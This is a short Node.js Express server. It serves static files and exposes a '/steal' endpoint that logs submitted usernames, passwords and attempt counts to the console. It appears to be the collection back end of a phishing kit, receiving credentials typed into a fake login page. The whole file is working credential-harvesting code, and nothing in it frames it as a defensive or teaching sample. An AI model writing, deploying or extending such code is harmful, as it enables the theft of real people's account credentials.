const express = require('express');
const path = require('path');
const app = express();

app.use(express.static(__dirname));

app.get('/steal', (req, res) => {
    console.log('📌 ATTEMPT:', req.query.attempt);
    console.log('✅ USERNAME:', req.query.username);
    console.log('✅ PASSWORD:', req.query.password);
    console.log('-----------------------------------');
    res.send('OK');
});

const port = process.env.PORT || 4000;
app.listen(port, () => console.log(`🚀 Server chalu hai on port ${port}`));
